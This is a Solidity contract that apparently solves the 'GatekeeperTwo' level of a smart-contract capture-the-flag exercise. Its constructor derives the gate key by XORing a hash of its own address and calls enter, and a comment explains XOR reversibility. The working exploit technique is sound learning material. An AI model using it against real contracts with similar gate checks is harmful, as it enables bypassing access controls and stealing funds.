// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solution_2{
    GatekeeperTwo gate;
    bytes8 public _gateKey;
    
    constructor(address _cA){
        gate = GatekeeperTwo(_cA);
        _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max); 
        gate.enter(_gateKey);
    }
}


/*
3 ^ 5 = 6     //( ^  = XOR )
To get the second number (5) from the first number (3) and the result (6) of an XOR operation, you can perform another XOR operation with the first number. This is because XOR is a reversible operation, meaning that if you apply it twice with the same operand, you get back the original operand.

So, to get the second number (5) from the first number (3) and the result (6), you can perform the following XOR operation:

6 ^ 3 = 5
*/
